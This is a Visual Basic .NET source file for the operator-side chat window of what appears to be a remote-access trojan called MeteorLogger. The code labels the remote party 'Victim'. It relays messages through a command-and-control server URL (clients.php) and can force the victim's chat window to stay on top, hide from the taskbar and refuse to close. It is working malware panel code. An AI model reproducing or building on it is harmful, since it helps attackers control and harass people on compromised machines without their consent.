﻿Imports System.ComponentModel
Imports System.Net
Imports System.Net.Mail
Imports System.Text

Public Class RemoteChat
    Public targetIp As String = ""
    Private chatFluxThread As New Threading.Thread(Sub() chatFluxManage())
    Dim messageList As New List(Of Tuple(Of String, Boolean)) ' Respectively : message and isAdmin
    Dim firstIter As Boolean = True
    Dim sendMessageAllowed As Boolean = True

    Private Sub remotechat_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Remote Chat @ " & targetIp
        chatFluxThread.Start()
    End Sub

    Private Sub RemoteChat_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Dim client As New WebClient()
        chatFluxThread.Abort()
        client.DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=closeremotechat")
    End Sub

    Private Sub messageTB_TextChanged(sender As Object, e As EventArgs) Handles messageTB.TextChanged
        sendButton.Enabled = messageTB.Text.Trim <> ""
    End Sub

    Private Sub RefreshChat()
        Try
            chatWindow.Clear()

            For Each message In messageList
                chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = "("

                If message.Item2 Then ' isAdmin
                    chatWindow.SelectionColor = Color.Red : chatWindow.SelectedText = "You"
                Else
                    chatWindow.SelectionColor = Color.Green : chatWindow.SelectedText = "Victim"
                End If

                chatWindow.SelectionColor = Color.Black : chatWindow.SelectedText = ") >> " & message.Item1 & vbCrLf
            Next

            If messageList.Count > 100 Then messageList.Clear()
            chatWindow.ScrollToCaret() : chatWindow.Refresh()
        Catch ex As AccessViolationException
            MsgBox("Memory exception occured. Click OK to reload the tchat panel-side.",
                MsgBoxStyle.Exclamation, "MeteorLogger - Remote chat @" & targetIp)
            RefreshChat()
        End Try
    End Sub

    Private Sub DisplayVictimLeave()
        For i = 0 To 4
            chatWindow.Text &= Space(16) & "|" & Space(16) & vbCrLf
        Next

        chatWindow.Text &= "--- Victim has closed the chat window ---"
        chatWindow.SelectionStart = chatWindow.Text.Length : chatWindow.ScrollToCaret() : chatWindow.Refresh()
        messageTB.Enabled = False
    End Sub

    Private Sub StartCooldown(interval As Integer)
        sendMessageAllowed = False
        Threading.Thread.Sleep(interval)
        Invoke(Sub() messageTB.Clear())
        sendMessageAllowed = True
    End Sub

    Private Sub SendButtonClickSub()
        If messageTB.Text.Trim.Length = 0 Or Not sendMessageAllowed Then Exit Sub

        Dim showInTaskBar = "0", alwaysOnTop = "1", allowCloseChat = "0"

        If allowCloseChatCB.Checked Then allowCloseChat = "1"
        If showIconCB.Checked Then showInTaskBar = "1"
        If topMostCB.Checked Then alwaysOnTop = "1"

        Dim sendMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
                            "clients.php?action=adminsend&target=" & targetIp &
                            "&actioncontent=" & showInTaskBar &
                            "&actioncontent2=" & alwaysOnTop &
                            "&actioncontent3=" & allowCloseChat &
                            "&actioncontent4=" & Convert.ToBase64String(Encoding.UTF8.GetBytes(messageTB.Text)))

        messageList.Add(New Tuple(Of String, Boolean)(messageTB.Text, True))
        RefreshChat()
        messageTB.Clear()

        Dim cooldownThread As New Threading.Thread(Sub() StartCooldown(1000))
        cooldownThread.Start()
    End Sub

    Private Sub sendButton_Click(sender As Object, e As EventArgs) Handles sendButton.Click
        ' TODO : Make a cooldown
        SendButtonClickSub()
    End Sub

    Private Sub ChatFluxManage()
        Dim lastMessageReceived As String = ""

        While True
            Dim receivedMessageQuery = New WebClient().DownloadString(My.Settings.vpsurl &
                             "clients.php?action=adminreceive&target=" & targetIp)

            If receivedMessageQuery = lastMessageReceived Then
                GoTo EndOfTreatement
            Else
                lastMessageReceived = receivedMessageQuery
            End If

            If receivedMessageQuery.Trim = "" Then
                GoTo EndOfTreatement
            End If

            Dim parsedMsg As String() = receivedMessageQuery.Split("|")

            ' TODO : What to do when the client's form isn't closed properly ?
            ' For example if you RAT shutdown it and the form_close event doesn't
            ' trigger ?
            If parsedMsg(0) = "close" And Not firstIter Then
                displayVictimLeave()
                Exit While
            End If

            If Not firstIter Then
                Dim decodedMsg As String =
                Encoding.UTF8.GetString(Convert.FromBase64String(parsedMsg(0)))


                messageList.Add(New Tuple(Of String, Boolean)(decodedMsg, False))
            End If

            refreshChat()
EndOfTreatement:
            firstIter = False
            Threading.Thread.Sleep(100)
        End While
    End Sub

    Private Sub messageTB_KeyDown(sender As Object, e As KeyEventArgs) Handles messageTB.KeyDown
        If e.KeyCode = Keys.Enter Then
            e.SuppressKeyPress = True
            sendButtonClickSub()
        End If
    End Sub

    Dim removeCooldownMsg As Boolean = False
    Private Sub cooldownTimer_Tick(sender As Object, e As EventArgs) Handles cooldownTimer.Tick
        If Not sendMessageAllowed Then
            sendButton.Enabled = False
            messageTB.ForeColor = Color.Gray
            messageTB.Text = "Cooldown..."
            messageTB.ReadOnly = True
            removeCooldownMsg = True

        ElseIf removeCooldownMsg Then
            removeCooldownMsg = False
            messageTB.ReadOnly = False
            messageTB.ForeColor = Color.Black
            sendButton.Enabled = True
        End If
    End Sub
End Class